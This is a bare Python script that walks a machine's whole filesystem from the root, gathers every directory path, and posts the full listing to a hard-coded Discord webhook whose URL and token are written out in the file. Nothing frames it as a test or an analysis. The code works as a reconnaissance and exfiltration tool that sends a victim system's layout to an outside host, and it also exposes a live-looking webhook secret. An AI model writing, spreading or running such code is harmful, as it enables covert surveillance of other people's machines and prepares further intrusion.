import os
import requests

# Replace with your Discord webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1268297928531902555/aT01mZfDNgV74kTg6rgZwXwNcxTvum6S3Q4hR-Ow0rtO5vZ7lrxtwvmStvzGWnMbR9QA'

def get_all_directories(start_path):
    directories = []
    for root, dirs, _ in os.walk(start_path):
        for dir_name in dirs:
            full_path = os.path.join(root, dir_name)
            directories.append(full_path)
    return directories

def send_to_discord(content):
    payload = {
        'content': content
    }
    response = requests.post(WEBHOOK_URL, json=payload)
    if response.status_code == 204:
        print("Message successfully sent to Discord.")
    else:
        print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")

def main():
    start_path = '/'  # Use '/' for Unix-based systems or 'C:\\' for Windows
    directories = get_all_directories(start_path)
    
    # Convert list to a single string with each directory on a new line
    directories_content = '\n'.join(directories)
    
    send_to_discord(directories_content)

if __name__ == "__main__":
    main()
